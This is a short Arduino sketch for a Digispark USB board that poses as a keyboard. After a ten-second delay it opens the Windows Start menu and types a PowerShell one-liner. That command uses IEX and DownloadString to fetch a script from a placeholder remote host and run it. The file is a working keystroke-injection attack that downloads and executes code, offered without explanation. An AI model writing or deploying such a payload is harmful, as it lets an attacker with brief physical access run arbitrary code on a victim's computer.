#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.delay(10000);
  A("powershell \"IEX (New-Object Net.Webclient).DownloadString('http://X.X.X.X:P/A.ps1')\"");
  DigiKeyboard.delay(500);
}

void loop() {
}
  
void A(char *SC)
{
  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT); 
  DigiKeyboard.delay(1000);
  DigiKeyboard.print(SC);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

}
